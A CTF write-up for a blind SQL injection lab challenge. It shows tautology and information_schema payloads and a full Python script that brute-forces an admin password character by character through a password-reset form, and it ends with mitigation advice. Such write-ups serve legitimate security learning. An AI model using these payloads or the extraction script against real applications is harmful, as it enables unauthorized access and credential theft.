---
title: 🚩0x4148 — Blind SQL Injection Write-up
published: 2025-06-22
description: ⭐ NANO IS HERE ⭐
tags: [SQL Injection, Challenge, sql injection, Blind ,ctf,CyberSecurity]
image: "./ban2.png"
category: Web Security

draft: false
---
> Cover image source: [Source](./ban2.png)

 Introduction
---------------

Hey NAN0 IS  here 

In this write-up, we’ll walk step-by-step through solving the `0x4148 - Blind SQL Injection` challenge.

The challenge focuses on **Blind SQL Injection**, where no error messages are displayed, but behavior changes depending on the query logic. Let’s dive in.

 Step 1 — Detecting the Vulnerability
---------------------------------------

TARGET:[https://livelabs.0x4148.com/challenges/boolean_1/](https://livelabs.0x4148.com/challenges/boolean_1/)

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PKiKNs52HkQFff1KALqaEQ.png)

We start by testing for SQL injection via the password reset form.

We try the classic SQL payload in the `username` field:

```
' OR 1='1 -- -
```

Input example:

```
NAN0' OR 1='1 -- -
```

If the application responds with:

> _“A password reset email has been sent.”_

Then it’s very likely that the application is **vulnerable to SQL Injection**, even if it’s **blind**.

Step 2 — Understanding the Query Behind
---------------------------------------

We assume the backend query looks something like:

```
SELECT * FROM users WHERE username = 'input_username';
```

Our goal is to manipulate this query to extract hidden data from the database.

Step 3 — Confirm Table Existence
--------------------------------

To confirm if the `users` table exists, we leverage the `information_schema.tables`:

```
admin' AND (SELECT 'z' FROM information_schema.tables WHERE table_name='users')='z
```

*   If the response is: **“A password reset email has been sent.”** → ✅ Table exists.
*   If the response is: **“Invalid username.”** → ❌ Table does not exist.

This confirms that the table `users` is present.

Step 4 — Extracting the Admin’s Password
----------------------------------------

Now that we know the table exists, let’s extract the password of the `admin` user **character by character** using blind Boolean-based SQL Injection.

We’ll automate this using Python and the `requests` library.

Python Script
-------------

```
import requests
import string
# Character set to try (you can modify it to speed up)
charlist = list(string.ascii_letters + string.digits + string.punctuation)
passlist = []
# Looping through first 15 characters
for i in range(1, 16):
    for char in charlist:
        burp0_url = "https://livelabs.0x4148.com/challenges/boolean_1/"
        burp0_headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://livelabs.0x4148.com/challenges/boolean_1/"
        }
        # Payload to test if character at position i matches current character
        burp0_data = {
            "username": f"admin' AND (SELECT 'z' FROM users WHERE substring(password,{i},1)='{char}' AND username='admin' LIMIT 1)='Z",
            "reset_password": ''
        }
        response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print(f"Trying position {i} with char: {char}")
        if "A password reset email has been sent" in response.text:
            print(f"[+] Found char at position {i}: {char}")
            passlist.append(char)
            break
# Print full password
password = ''.join(passlist)
print("[+] Extracted password:", password)
```

 Explanation of the Script
----------------------------

*   `**string.ascii_letters + digits + punctuation**`: We try all possible characters.
*   `**substring(password, i, 1)**`: We check each character of the password one by one.
*   **Response check**: If the response is positive, that means the character is correct.

This script automates the blind extraction process.

🛡️ Recommendations
-------------------

*   Always sanitize user input using **prepared statements / parameterized queries**
*   Disable detailed responses during authentication processes
*   Apply rate-limiting and monitoring for brute-force behavior